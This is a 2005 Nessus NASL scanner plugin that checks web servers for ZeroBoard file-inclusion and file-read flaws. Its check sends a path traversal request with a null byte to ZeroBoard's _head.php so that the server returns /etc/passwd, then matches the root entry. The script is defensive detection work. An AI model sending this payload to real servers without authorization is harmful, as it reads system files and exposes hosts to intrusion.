#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref:  Jeremy Bae  - STG Security
#
# This script is released under the GNU GPL v2

if(description)
{
  script_id(16178);
  script_bugtraq_id(12258);
  if ( defined_func("script_xref") ) script_xref(name:"OSVDB", value:"12925");
  script_version("$Revision: 1.1 $");
  
  script_name(english:"ZeroBoard flaws (2)");

 desc["english"] = "
The remote host runs ZeroBoard, a web BBS application written in PHP.

The remote version of this CGI is vulnerable to multiple flaws which
may allow an attacker to execute arbitrary PHP commands on the remote host
by including a PHP file hosted on a third party server, or to read arbitrary 
files with the privileges of the remote web server.

Solution: Upgrade to the latest version of this software
Risk factor : Medium";

  script_description(english:desc["english"]);
  script_summary(english:"Checks ZeroBoard flaws");
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
  script_family(english:"CGI abuses");
  script_require_ports("Services/www", 80);
  script_dependencie("http_version.nasl");
  exit(0);
}

#the code

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! get_port_state(port))exit(0);
if ( ! can_host_php(port:port) ) exit(0);

foreach d (make_list(cgi_dirs()))
{
 req = http_get(item:string(d, "/_head.php?_zb_path=../../../../../etc/passwd%00"), port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if(res == NULL) exit(0);
 if(egrep(pattern:"root:.*:0:[01]:", string:res)){
        security_hole(port);
        exit(0);
        }
}
